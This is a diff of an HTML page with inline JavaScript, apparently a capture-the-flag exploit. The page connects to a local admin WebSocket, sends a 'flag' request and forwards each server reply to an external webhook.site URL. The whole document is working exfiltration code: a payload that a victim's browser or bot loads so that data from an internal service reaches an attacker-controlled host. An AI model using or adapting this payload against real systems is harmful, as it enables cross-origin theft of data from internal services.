@@ -3,28 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket to Webhook</title>
+    <title>WebSocket and Webhook Example</title>
 </head>
 <body>
-    <h1>WebSocket and Webhook Example</h1>
-
+    <h1>WebSocket to Webhook Example</h1>
     <script>
         // WebSocket URL
         const websocketURL = "ws://127.0.0.1:8080/admin/ws";
 
-        // Webhook URL (without query parameter)
-        const webhookBaseURL = "https://webhook.site/your-webhook-id";
+        // Webhook URL
+        const webhookBaseURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";
 
-        // Create a new WebSocket connection
+        // WebSocket initialization
         const socket = new WebSocket(websocketURL);
 
         // Flag message to send
         const flag = "flag";
 
-        // Function to send the flag to the webhook
-        function sendPostToWebhook(flag) {
-            const webhookURLWithFlag = `${webhookBaseURL}/flag=${encodeURIComponent(flag)}`;
-            console.log("Sending POST request to Webhook with flag:", flag);
+        // Function to send POST request to the webhook
+        function sendPostToWebhook(responseMessage) {
+            const webhookURLWithFlag = `${webhookBaseURL}/flag=${encodeURIComponent(responseMessage)}`;
+            console.log("Sending POST request to Webhook with message:", responseMessage);
 
             fetch(webhookURLWithFlag, {
                 method: "POST",
@@ -41,41 +40,31 @@
             });
         }
 
-        // Function to send the flag when the WebSocket is ready
-        function sendFlagWhenReady() {
-            if (socket.readyState === WebSocket.OPEN) {
-                console.log("WebSocket is ready. Sending flag:", flag);
+        // Event listener for WebSocket open event
+        socket.addEventListener("open", () => {
+            console.log("WebSocket connection opened. Sending flag after 50ms delay.");
+            // Wait 50 milliseconds before sending the flag
+            setTimeout(() => {
                 socket.send(flag);
-            } else {
-                socket.addEventListener("open", () => {
-                    console.log("WebSocket is now open. Sending flag:", flag);
-                    socket.send(flag);
-                });
-            }
-        }
-
-        // Call the function to send the flag
-        sendFlagWhenReady();
-
-        // Handle message received from WebSocket
-        socket.addEventListener("message", (event) => {
-            const receivedFlag = event.data;
-            console.log("Message received from server:", receivedFlag);
-
-            // Send the received flag to the webhook
-            if (receivedFlag && receivedFlag.trim().length > 0) {
-                sendPostToWebhook(receivedFlag);
-            } else {
-                console.log("Received empty flag, not sending POST request.");
-            }
+                console.log("Flag sent to WebSocket server:", flag);
+            }, 50);
         });
 
-        // Log WebSocket errors
+        // Event listener for receiving messages from WebSocket
+        socket.addEventListener("message", (event) => {
+            const responseMessage = event.data;
+            console.log("Message received from WebSocket server:", responseMessage);
+
+            // Send the received message to the webhook
+            sendPostToWebhook(responseMessage);
+        });
+
+        // Handle WebSocket errors
         socket.addEventListener("error", (error) => {
             console.error("WebSocket error occurred:", error);
         });
 
-        // Log when the WebSocket is closed
+        // Handle WebSocket close event
         socket.addEventListener("close", () => {
             console.log("WebSocket connection closed.");
         });
